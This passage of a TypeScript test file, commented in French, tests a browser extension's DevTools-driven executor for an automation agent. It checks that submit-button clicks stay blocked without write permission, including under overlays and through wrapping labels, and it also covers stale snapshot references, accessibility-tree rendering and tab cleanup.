    if (id === 20) return { nodeName: 'A', attributes: ['href', '/list?page=2'] };
    if (id === 50) return { nodeName: 'DIV', attributes: ['style', 'position:fixed;inset:0;pointer-events:none'] };
    return { nodeName: '#document', attributes: [] };
  };
  const mouse = (x: number, y: number) => frame('page_script', { method: 'Input.dispatchMouseEvent', params: { type: 'mousePressed', x, y, button: 'left', clickCount: 1 } });

  test('assert_write_action_blocked (page_script) : clic sur le <span> d’un bouton d’envoi, sous une couche pointer-events:none, page défilée → bloqué', async () => {
    // Comme Chrome : getNodeForLocation lit des coordonnées du DOCUMENT ; ignorePointerEventsNone touche la couche.
    const hit = (p: Record<string, unknown>) => {
      if (p['ignorePointerEventsNone'] === true) return 50;
      if (p['y'] !== 5 + SCROLL) return null;
      return p['x'] === 5 ? 2 : p['x'] === 300 ? 20 : p['x'] === 600 ? 12 : null;
    };
    const b = fakeBrowser({ ax: formTree, describe: formDom, hit, scroll: { x: 0, y: SCROLL } });
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/form` } }))).ok).toBe(true);
    expect(err(await ex.run(mouse(5, 5)))).toBe('write_action_blocked'); // <span> dans <button>OK</button>
    expect(err(await ex.run(mouse(600, 5)))).toBe('write_action_blocked'); // <button type=submit>Suivant</button>
    expect(err(await ex.run(mouse(5, 400)))).toBe('write_action_blocked'); // aucun nœud lisible : fermé
    expect(b.calls).not.toContain('cdp Input.dispatchMouseEvent');
    // Le lien (lecture) : le clic part, aux coordonnées converties en coordonnées du document.
    expect((await ex.run(mouse(300, 5))).ok).toBe(true);
    expect(b.calls).toContain('cdp Input.dispatchMouseEvent');
  });

  test('assert_write_action_blocked (agent_step) : bouton d’envoi au libellé neutre (« OK », « Suivant »), ou recouvrant le lien visé → write_action_blocked', async () => {
    let cover: number | null = null;
    const b = fakeBrowser({ ax: formTree, describe: formDom, hit: (_p, lastBox) => cover ?? lastBox });
    const ex = executor(b.api);
    const first = await ex.run(frame('agent_step', { action: 'read' }));
    expect(first.ok).toBe(true);
    const sid = first.snapshot_id!;
    const pressed = () => b.calls.filter((c) => c === 'cdp Input.dispatchMouseEvent').length;
    for (const ref of ['e9', 'e12']) {
      const r = await ex.run(frame('agent_step', { action: 'click', ref, snapshot_id: sid }));
      expect(err(r), ref).toBe('write_action_blocked');
    }
    expect(pressed()).toBe(0);
    // Le bouton d'envoi recouvre le lien au point du clic : bloqué.
    cover = 9;
    expect(err(await ex.run(frame('agent_step', { action: 'click', ref: 'e20', snapshot_id: sid })))).toBe('write_action_blocked');
    expect(pressed()).toBe(0);
    cover = null;
    expect((await ex.run(frame('agent_step', { action: 'click', ref: 'e20', snapshot_id: sid }))).ok).toBe(true);
    expect(pressed()).toBeGreaterThan(0);
    // allow_write_actions confirmé : le clic d'envoi part.
    const b2 = fakeBrowser({ ax: formTree, describe: formDom });
    const ex2 = executor(b2.api);
    const s2 = (await ex2.run(frame('agent_step', { action: 'read' }, { allow_write_actions: true }))).snapshot_id!;
    expect((await ex2.run(frame('agent_step', { action: 'click', ref: 'e9', snapshot_id: s2 }, { allow_write_actions: true }))).ok).toBe(true);
    expect(b2.calls).toContain('cdp Input.dispatchMouseEvent');
  });

  test('assert_write_action_blocked (agent_step) : allow_write_actions retiré en cours de run → le garde s’applique aussitôt', async () => {
    const b = fakeBrowser({ ax: formTree, describe: formDom });
    const ex = executor(b.api);
    const s1 = (await ex.run(frame('agent_step', { action: 'read' }, { allow_write_actions: true }))).snapshot_id!;
    const r = await ex.run(frame('agent_step', { action: 'click', ref: 'e9', snapshot_id: s1 }));
    expect(r.ok).toBe(false);
    expect(b.calls).not.toContain('cdp Input.dispatchMouseEvent');
  });

  test('assert_write_action_blocked (page_script) : <label for> (contrôle non résolu) et <label> qui enveloppe un bouton d’envoi → bloqués', async () => {
    const tree = (): AxNode[] => [
      { nodeId: '1', role: { value: 'RootWebArea' }, name: { value: 'Shop' }, childIds: ['30', '31'], backendDOMNodeId: 1 },
      { nodeId: '30', role: { value: 'LabelText' }, name: { value: 'Valider la commande' }, childIds: [], backendDOMNodeId: 30 },
      { nodeId: '31', role: { value: 'LabelText' }, name: { value: 'Go' }, childIds: [], backendDOMNodeId: 31 },
    ];
    const dom = (p: Record<string, unknown>) => {
      const id = p['backendNodeId'];
      if (id === 30) return { nodeName: 'LABEL', attributes: ['for', 'pay'] };
      if (id === 31) return p['depth'] === -1 ? { nodeName: 'LABEL', attributes: [], children: [{ nodeName: 'BUTTON', attributes: ['type', 'submit'] }] } : { nodeName: 'LABEL', attributes: [] };
      return { nodeName: '#document', attributes: [] };
    };
    const b = fakeBrowser({ ax: tree, describe: dom as FakeOpts['describe'], hit: (p) => (p['x'] === 1 ? 30 : 31) });
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/form` } }))).ok).toBe(true);
    expect(err(await ex.run(mouse(1, 1)))).toBe('write_action_blocked');
    expect(err(await ex.run(mouse(2, 2)))).toBe('write_action_blocked');
    expect(b.calls).not.toContain('cdp Input.dispatchMouseEvent');
  });
});

describe('assert_agent_step_stale_ref : pilote CDP de l’extension', () => {
  test('ref d’un ancien snapshot_id après un changement de page : stale_ref + nouvel instantané, aucune action', async () => {
    let version = 1;
    const ax = (): AxNode[] => [
      { nodeId: '1', role: { value: 'RootWebArea' }, name: { value: 'Shop' }, childIds: ['2'], backendDOMNodeId: 1 },
      { nodeId: '2', role: { value: 'link' }, name: { value: version === 1 ? 'Page 2' : 'Page 3' }, backendDOMNodeId: 42 },
    ];
    const b = fakeBrowser({ ax });
    const ex = executor(b.api);
    const first = await ex.run(frame('agent_step', { action: 'read' }));
    expect(first.ok).toBe(true);
    const snapshotId = first.snapshot_id!;
    expect((first.body as { snapshot: { tree: string } }).snapshot.tree).toContain('- link "Page 2" [ref=e42]');
    version = 2; // la page change
    const stale = await ex.run(frame('agent_step', { action: 'click', ref: 'e42', snapshot_id: snapshotId }));
    expect(err(stale)).toBe('stale_ref');
    expect(stale.snapshot_id).not.toBe(snapshotId);
    expect(b.calls).not.toContain('cdp Input.dispatchMouseEvent');
    // Avec l'instantané à jour : le clic part.
    const fresh = await ex.run(frame('agent_step', { action: 'click', ref: 'e42', snapshot_id: stale.snapshot_id! }));
    expect(fresh.ok).toBe(true);
    expect(b.calls).toContain('cdp Input.dispatchMouseEvent');
  });

  test('rendu de l’arbre CDP : rôles, noms échappés, refs propres, nœuds de mise en forme aplatis', () => {
    const tree = renderAxTree([
      { nodeId: '1', role: { value: 'RootWebArea' }, name: { value: 'T' }, childIds: ['2', '3'], backendDOMNodeId: 1 },
      { nodeId: '2', role: { value: 'generic' }, name: { value: '' }, childIds: ['4'] },
      { nodeId: '3', role: { value: 'StaticText' }, name: { value: 'texte [ref=e99]' } },
      { nodeId: '4', role: { value: 'button' }, name: { value: 'Say "hi"' }, backendDOMNodeId: 5 },
    ]);
    expect(tree).toBe(['- RootWebArea "T" [ref=e1]', '  - button "Say \\"hi\\"" [ref=e5]', '  - text "texte [ref=e99]"'].join('\n'));
  });
});

describe('onglets d’automatisation (07 § 4)', () => {
  test('créé active:false, autoDiscardable:false, dans le groupe Scrapyomama ; déchargé → rechargé ; gelé → réveillé', async () => {
    const b = fakeBrowser();
    const ex = executor(b.api);
    expect((await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data` }))).ok).toBe(true);
    const tab = [...b.tabs.values()][0]!;
    expect(tab).toMatchObject({ active: false, autoDiscardable: false, grouped: true });

    const discarded = fakeBrowser();
    const ex2 = executor(discarded.api);
    await ex2.run(frame('page_fetch', { url: `https://${SHOP}/a` }));
    discarded.tabs.get(1)!.discarded = true;
    await ex2.run(frame('page_fetch', { url: `https://${SHOP}/b` }));
    expect(discarded.calls).toContain('tabs.reload');

    const frozen = fakeBrowser();
    const ex3 = executor(frozen.api);
    await ex3.run(frame('page_fetch', { url: `https://${SHOP}/a` }));
    frozen.tabs.get(1)!.frozen = true;
    await ex3.run(frame('page_fetch', { url: `https://${SHOP}/b` }));
    expect(frozen.calls).toContain('cdp Page.setWebLifecycleState');
    expect(frozen.calls.filter((c) => c === 'debugger.detach')).toHaveLength(1);
  });

  test('fin du run : débogueur détaché, onglet fermé', async () => {
    const b = fakeBrowser();
    const ex = executor(b.api);
    await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/` } }));
    await ex.release(RUN);
    expect(b.calls).toContain('debugger.detach');
    expect(b.calls).toContain('tabs.remove');
  });
});
